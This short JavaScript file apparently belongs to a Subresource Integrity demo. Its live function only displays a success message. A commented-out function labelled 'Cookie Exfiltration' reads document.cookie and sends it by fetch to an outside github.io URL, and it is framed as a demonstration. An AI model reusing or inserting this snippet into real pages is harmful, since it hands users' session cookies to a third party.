function showMessage() {
  document.getElementById('output').textContent = 'SRI script loaded successfully ✅';
}


/*
// Cookie Exfiltration
function simulateSteal() {
  // Fake "cookie" value for demonstration purposes only.
  const Cookie = document.cookie;

  // Build a GET URL with the cookie as a query parameter.
  const url = 'https://7ragnarok7.github.io/SRI?data=' + encodeURIComponent(Cookie);
  fetch(url, { method: 'GET', credentials: 'omit' })
    .then(response => {
      console.log('Exfiltration request sent. Response status:', response.status);
    })
    .catch(err => {
      console.warn('Exfiltration request failed (expected in some environments):', err);
    });
}
*/
